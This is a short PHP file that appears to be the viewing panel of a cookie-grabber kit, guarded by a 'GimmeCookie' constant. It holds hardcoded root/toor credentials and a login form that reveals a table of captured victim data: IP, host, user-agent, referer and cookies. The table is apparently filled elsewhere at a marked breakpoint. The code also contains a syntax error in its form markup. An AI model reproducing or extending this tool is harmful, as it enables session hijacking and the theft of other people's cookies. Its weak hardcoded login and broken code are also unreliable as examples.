<?PHP
// Protection against unauthorized access
if (!defined('GimmeCookie')) {
    header('Location: ./main');
    die;
}

$LOGIN="root";  // login
$PASSWD="toor";   // password

$STORAGE = '<p><br/>
Cookies:</p>
<table width="726" border="1">
<tr><td>IP:</td><td>Host:</td><td>User-Agent:</td><td>Date:</td><td>Time:</td><td>Referer:</td><td>Cookie:</td></tr>
<!-- Breakpoint -->
</table>
<p>&nbsp;</p>';

if ($_POST['logintext'] == $LOGIN && $_POST['passwdtext'] == $PASSWD) {
$content = $STORAGE;
} else {
  $content = '<p>Log in to continue</p>
<form name="connexion" action="'.echo ($_SERVER['PHP_SELF']).'" method="post">
  <table width="298" border="1">
<tr>
        <td width="102">Login :</td>
      <td width="180"><input name="logintext" type="text" size="30" maxlength="30" /></td>
      </tr>
      <tr>
        <td>Password :</td>
        <td><input name="passwdtext" type="text" size="30" maxlength="30" /></td>
      </tr>
    </table>
  <table width="298" border="0">
    <tr>
      <td><div align="center">
        <input name="envoi" type="submit" value="-= Connect =-" />
      </div></td>
    </tr>
  </table>
  </form>
  <p>&nbsp;</p>';
}
?>